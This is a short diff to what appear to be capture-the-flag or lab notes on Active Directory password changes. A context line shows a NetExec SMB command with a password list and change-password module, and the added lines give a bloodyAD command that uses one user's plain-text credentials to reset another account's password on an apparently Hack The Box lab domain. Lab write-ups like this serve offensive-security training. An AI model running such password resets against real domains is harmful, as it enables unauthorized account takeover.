@@ -19,3 +19,9 @@ Could also be possible with this nxc module.
 ```
 nxc smb baby.vl -u caroline.robinson -p passwords.txt -M change-password -o NEWPASS=Warrior32
 ```
+
+or with bloodyad
+
+```
+bloodyad --host 10.129.41.20 -d puppy.htb -u ant.edwards -p 'Antman2025!' set password 'adam.silver' 'Password123!'
+```
